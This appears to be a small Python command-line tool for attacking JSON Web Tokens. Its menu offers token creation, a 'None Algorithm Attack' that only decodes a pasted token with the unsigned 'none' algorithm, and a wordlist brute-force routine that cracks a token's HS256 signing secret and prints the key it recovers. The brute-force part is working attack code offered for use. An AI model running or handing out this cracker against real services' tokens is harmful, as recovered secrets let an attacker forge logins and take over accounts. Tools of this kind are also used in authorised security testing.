import jwt
from colorama import init, Fore, Style

init(autoreset=True)  # Initialize colorama


def createJWT():
    print("Enter the algo to be used: ")
    algo = input()
    jsonData = {
        "key1": "val1",
        "key2": "val2"
    }

    if algo == "none":
        print(jwt.encode(jsonData, key="", algorithm=algo))
    else:
        secret = input("Enter the secret key: ")
        print(jwt.encode(jsonData, secret, algorithm=algo))


def noneAlgoAttack():
    jwtToken = input("Enter the JWT token: ")
    try:
        print(jwt.decode(jwtToken, algorithms=['none']))
    except jwt.exceptions.InvalidSignatureError:
        print(Fore.RED + "Invalid signature")
    except jwt.exceptions.InvalidKeyError:
        print(Fore.RED + "Invalid JWT key")
    except jwt.exceptions.InvalidAlgorithmError:
        print(Fore.RED + "Invalid JWT algorithm")


def bruteForceAttack():
    jwtToken = input("Enter the JWT token: ")
    wordlist = input("Enter the wordlist path: ")
    try:
        with open(wordlist, "r") as f:
            for line in f:
                secret = line.strip()  # Remove any trailing whitespaces or newlines
                try:
                    print(jwt.decode(jwtToken, secret.encode(),
                          algorithms=['HS256']))
                    print(Fore.GREEN + "Secret key found: " + line)
                    break
                except jwt.exceptions.InvalidSignatureError:
                    print(Fore.RED + "Invalid signature for key " + secret)
                except jwt.exceptions.InvalidKeyError:
                    print(Fore.RED + f"Invalid JWT key {secret}")
                except jwt.exceptions.InvalidAlgorithmError:
                    print(Fore.RED + "Invalid JWT algorithm")
    except FileNotFoundError:
        print(Fore.RED + "File not found")


print("Choose your option: ")
print("1. Create a JWT token")
print("2. None Algorithm Attack")
print("3. Brute Force Attack")

option = int(input())

if option == 1:
    createJWT()
elif option == 2:
    noneAlgoAttack()
elif option == 3:
    bruteForceAttack()
